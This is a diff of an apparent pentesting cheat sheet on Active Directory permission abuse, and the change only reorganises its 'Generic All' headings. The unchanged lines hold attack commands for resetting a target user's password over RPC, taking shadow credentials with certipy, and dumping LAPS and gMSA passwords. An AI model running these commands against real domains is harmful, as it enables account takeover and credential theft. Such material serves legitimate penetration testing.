@@ -73,7 +73,12 @@ owneredit.py -action read -target 'targetGroup' domain.com/username:pass
 owneredit.py -action write -owner 'username' -target 'targetGroup' domain.com/username:pass
 ```
 
-## GenericAll on User
+## Generic All
+
+![Alt text](/Images/image-13.png)
+
+
+### GenericAll on User
 
 ```bash
 net rpc password targetUser -U domain.com/username%password -S dc.domain.com #Insert passwor
@@ -82,7 +87,7 @@ rpcclient -U domain.com/user dcIP
 rpcclient $> setuserinfo2 targetUser 23 newPassUser
 ```
 
-## GenericAll on Computer
+### GenericAll on Computer
 
 ```bash
 certipy shadow auto -u username@domain.com -p 'password' -account 'computer$'
@@ -112,10 +117,6 @@ crackmapexec ldap dcIP -d domain.com -u user -p password --module laps
 ```bash
 gMSADumper.py -u 'user' -p 'password' -d 'domain.local'
 ```
-
-## Generic All
-
-![Alt text](/Images/image-13.png)
 
 
 
